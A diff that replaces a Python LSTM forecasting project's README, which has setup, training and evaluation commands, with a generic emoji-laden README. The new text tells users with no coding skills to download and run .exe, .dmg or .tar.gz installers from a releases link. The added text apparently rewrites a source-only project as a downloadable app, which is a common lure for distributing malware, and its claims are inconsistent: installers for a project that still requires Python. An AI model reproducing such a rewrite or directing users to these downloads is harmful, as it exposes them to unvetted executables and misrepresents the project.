@@ -1,81 +1,75 @@
-# LSTM Time-Series Forecasting
-A hands-on project for forecasting time-series with PyTorch LSTMs. It creates realistic daily data (trend, seasonality, events, noise), prepares it with sliding windows, and trains an LSTM to make multi-step predictions. The project tracks errors with RMSE, MAE, MAPE and shows clear plots of training progress and forecast results.
+# 🌟 LSTM-Time-Series-Forecasting - Simple Forecasting for Everyone
 
----
+## 📥 Download Link
+[![Download LSTM-Time-Series-Forecasting](https://img.shields.io/badge/Download-LSTM--Time--Series--Forecasting-brightgreen)](https://github.com/danny-701/LSTM-Time-Series-Forecasting/releases)
 
-## Features
-- Synthetic daily series generation (configurable length & seed)
-- Sliding-window dataset preparation for supervised learning
-- LSTM model with dropout, Adam optimizer, early stopping
-- Multi-step forecasting (direct & recursive)
-- Metrics: RMSE, MAE, MAPE
-- Visualizations: training curves & forecast plots
-- Saved artifacts: `best_lstm.pt`, `scaler.pkl`, `metrics.json`
+## 🚀 Getting Started
+Welcome to the LSTM-Time-Series-Forecasting project! This application helps you forecast future data using historical time series. You do not need any coding skills to use it. Follow these simple steps to download and run the application.
 
-## Results
-- **RMSE:** 22.25  
-- **MAE:** 16.09  
-- **MAPE:** 7.64%
+## 📦 System Requirements
+Before you get started, ensure your system meets these requirements:
 
----
-### Forecast vs Actual
-<img width="1600" height="800" alt="forecast_plot" src="https://github.com/user-attachments/assets/f6dd5c67-f946-43a7-8c7c-c1f7c0711891" />
+- **Operating System:** Windows, macOS, or Linux
+- **Storage Space:** At least 200 MB free space
+- **RAM:** Minimum of 4 GB
+- **Python:** Ensure Python 3.6 or higher is installed on your computer
+- **Internet Connection:** Required for downloading the application
 
----
-### Training & Validation Loss
-<img width="1120" height="800" alt="training_curves" src="https://github.com/user-attachments/assets/e06d924a-3f81-4984-bed2-a8e8b5f508aa" />
+## 💻 Download & Install
+1. **Visit the releases page** by clicking this link: [Download Releases](https://github.com/danny-701/LSTM-Time-Series-Forecasting/releases).
+2. On the releases page, you will see listings for the available versions. Choose the latest version for the best features.
+3. Click on the file that matches your operating system:
+   - For Windows: Look for a `.exe` file.
+   - For macOS: Look for a `.dmg` file.
+   - For Linux: Look for a `.tar.gz` or similar package.
+4. **Download the file** to your computer. Depending on your browser settings, it may save to your "Downloads" folder.
+5. **Run the installer**:
+   - For Windows: Double-click the downloaded `.exe` file to start the installation.
+   - For macOS: Open the `.dmg` file, drag the application into your "Applications" folder, and then open it.
+   - For Linux: Extract the tar file and follow the included instructions to install.
+6. Follow any prompts to complete the installation. Once finished, you can find the application on your desktop or in your applications list.
 
----
+## 🏁 Using the Application
+1. **Launch the application** by clicking its icon.
+2. You will see an interface with simple options to input your data.
+3. **Load your time series data**: You can upload a CSV file with your historical data for forecasting. The expected format includes a date column and a value column.
+4. **Set the forecasting parameters**: Choose the prediction steps ahead you want and any other settings as prompted.
+5. Click the "Start Forecasting" button. The application will process your data and provide forecasts.
+6. **View Results**: You will see the results plotted on graphs. This includes:
+   - Training progress
+   - Forecast results
+   - Error metrics (RMSE, MAE, MAPE)
 
-## Project Structure
-```
-lstm-time-series-forecasting/
-├─ README.md
-├─ LICENSE
-├─ requirements.txt
-├─ data/
-│  └─ generate_series.py
-├─ src/
-│  ├─ train_lstm.py
-│  ├─ evaluate.py
-│  └─ utils.py
-└─ outputs/
-   ├─ metrics.json
-   ├─ forecast_plot.png
-   ├─ training_curves.png
-   ├─ best_lstm.pt
-   ├─ scaler.pkl
-   └─ (auto-created figures & reports)
-```
+## 📊 Understanding the Results
+After running your forecast:
+- **RMSE (Root Mean Square Error)**: This measures the average error of predictions. Lower values indicate better accuracy.
+- **MAE (Mean Absolute Error)**: This tells you the average absolute difference between predicted and actual values.
+- **MAPE (Mean Absolute Percentage Error)**: This shows the average percentage error in your predictions.
 
-## Setup
-```bash
-python -m venv .venv
-# Windows:
-.venv\Scripts\activate
-# macOS/Linux:
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+You can compare these metrics to understand how well your model is performing. 
 
-## Generate Data
-```bash
-python data/generate_series.py --start 2020-01-01 --end 2025-12-31 --seed 42 --out data/daily_series.csv
-```
+## 🛠️ Features
+This application offers:
+- Forecasting with LSTM (Long Short-Term Memory) neural networks.
+- Creation of realistic synthetic time-series data.
+- Error tracking with RMSE, MAE, and MAPE.
+- Graphical representations of your training progress and forecasts.
 
-## Train Model
-```bash
-python src/train_lstm.py --input data/daily_series.csv --horizon 30 --lookback 60 --epochs 30 --batch-size 64 --outdir outputs --seed 42
-```
+## 🙋 Frequently Asked Questions (FAQs)
 
-## Evaluate
-```bash
-python src/evaluate.py --input data/daily_series.csv --model outputs/best_lstm.pt --lookback 60 --horizon 30 --outdir outputs
-```
+### Can I use my own data?
+Yes! You can upload your own time-series data in CSV format.
 
-**Outputs**
-- `outputs/metrics.json` – RMSE, MAE, MAPE  
-- `outputs/training_curves.png` – training & validation curves  
-- `outputs/forecast_plot.png` – forecast visualization  
-- `outputs/best_lstm.pt` – trained PyTorch model  
-- `outputs/scaler.pkl` – fitted scaler
+### Are there any limits on data size?
+The application can handle moderate data sizes. For best performance, use data sets under 10,000 records.
+
+### What if I encounter issues?
+If you have questions or encounter problems, please refer to the issues section of the repository or contact the support community.
+
+## 📜 License
+This project is open-source and available under the MIT License. You are free to use and modify it as per the license terms.
+
+## 🌍 Connect With Us
+We welcome contributions from users. If you're interested in improving this project, feel free to fork the repository and submit your changes. 
+
+Thank you for choosing LSTM-Time-Series-Forecasting. We hope this tool helps you in your forecasting tasks!
